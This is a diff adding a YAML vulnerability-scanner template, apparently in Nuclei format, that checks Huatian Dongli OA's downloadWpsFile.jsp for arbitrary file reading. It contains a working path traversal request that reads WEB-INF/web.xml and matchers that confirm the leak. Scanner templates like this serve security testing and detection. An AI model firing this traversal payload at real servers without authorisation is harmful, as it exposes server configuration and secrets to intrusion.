@@ -1,0 +1,24 @@
+id: hua-tian-dong-li-oa-downloadwpsfile-anyfile-read
+info:
+  name: 华天动力OA downloadWpsFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "fileName="
